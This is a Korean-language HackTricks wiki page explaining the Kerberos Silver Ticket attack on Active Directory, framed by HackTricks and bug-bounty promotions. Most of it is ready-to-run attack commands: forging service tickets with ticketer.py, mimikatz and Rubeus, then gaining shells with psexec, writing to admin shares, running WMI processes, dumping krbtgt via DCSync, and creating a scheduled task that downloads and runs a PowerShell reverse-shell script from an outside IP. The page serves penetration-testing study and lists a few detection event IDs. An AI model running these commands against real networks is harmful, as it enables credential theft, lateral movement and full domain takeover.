# 실버 티켓

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **제로부터 영웅까지 AWS 해킹 배우기**!</summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고**하거나 **PDF로 HackTricks 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [Discord 그룹](https://discord.gg/hRep4RUj7f)** 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**버그 바운티 팁**: **해커들에 의해 만들어진 프리미엄 버그 바운티 플랫폼**인 **Intigriti**에 **가입**하세요! 오늘 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 참여하여 **최대 $100,000**의 바운티를 획득하세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

## 실버 티켓

**실버 티켓(Silver Ticket)** 공격은 Active Directory (AD) 환경에서 서비스 티켓을 악용하는 공격입니다. 이 방법은 **서비스 계정(컴퓨터 계정과 같은)**의 NTLM 해시를 획득하여 Ticket Granting Service (TGS) 티켓을 위조하는 데 의존합니다. 이러한 위조된 티켓을 사용하여 공격자는 네트워크에서 **특정 서비스에 액세스**할 수 있으며, 일반적으로 관리 권한을 목표로 **어떤 사용자든 흉내**낼 수 있습니다. 티켓을 위조하기 위해 AES 키를 사용하는 것이 더 안전하고 감지하기 어렵다는 점이 강조됩니다.

티켓 작성에는 운영 체제에 따라 다양한 도구가 사용됩니다:

### 리눅스에서
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windows에서
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
## 사용 가능한 서비스

| 서비스 유형                               | 서비스 실버 티켓                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>운영 체제에 따라 다음도 가능:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>일부 경우에는 WINRM만 요청할 수도 있음</p> |
| 예약된 작업                            | HOST                                                                       |
| Windows 파일 공유, 또한 psexec            | CIFS                                                                       |
| LDAP 작업, DCSync 포함           | LDAP                                                                       |
| Windows 원격 서버 관리 도구 | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

**Rubeus**를 사용하여 다음 매개변수를 사용하여 **모든** 이러한 티켓을 요청할 수 있습니다:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### 실버 티켓 이벤트 ID

* 4624: 계정 로그온
* 4634: 계정 로그오프
* 4672: 관리자 로그온

## 서비스 티켓 남용

다음 예에서는 티켓이 관리자 계정을 흉내 내어 검색된 것으로 가정합니다.

### CIFS

이 티켓을 사용하면 **SMB**를 통해 `C$` 및 `ADMIN$` 폴더에 액세스하고 원격 파일 시스템의 일부로 파일을 복사할 수 있습니다. 다음과 같이 수행하면 됩니다:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
### 호스트

이 권한을 사용하면 원격 컴퓨터에서 예약된 작업을 생성하고 임의의 명령을 실행할 수 있습니다:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

이 티켓을 사용하면 피해 시스템에서 **WMI를 실행**할 수 있습니다:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
다음 페이지에서 **wmiexec에 대한 자세한 정보를 찾아보세요**:

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### 호스트 + WSMAN (WINRM)

컴퓨터에서 winrm 액세스를 통해 **액세스**할 수 있고 PowerShell을 실행할 수 있습니다:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
다음 페이지를 확인하여 **winrm을 사용하여 원격 호스트에 더 많은 방법으로 연결하는 방법**을 알아보세요:

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
**원격 컴퓨터에서 winrm이 활성화되어 있고 수신 대기 중**이어야 액세스할 수 있음을 유의하십시오.
{% endhint %}

### LDAP

이 권한으로 **DCSync**를 사용하여 DC 데이터베이스를 덤프할 수 있습니다:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSync에 대해 더 알아보세요** 다음 페이지에서:

## 참고 자료

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**버그 바운티 팁**: **Intigriti에 가입**하여 **해커들이 만든 프리미엄 버그 바운티 플랫폼**에 참여하세요! [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 오늘 가입하고 최대 **$100,000**의 바운티를 받아보세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>제로부터 영웅이 될 때까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>
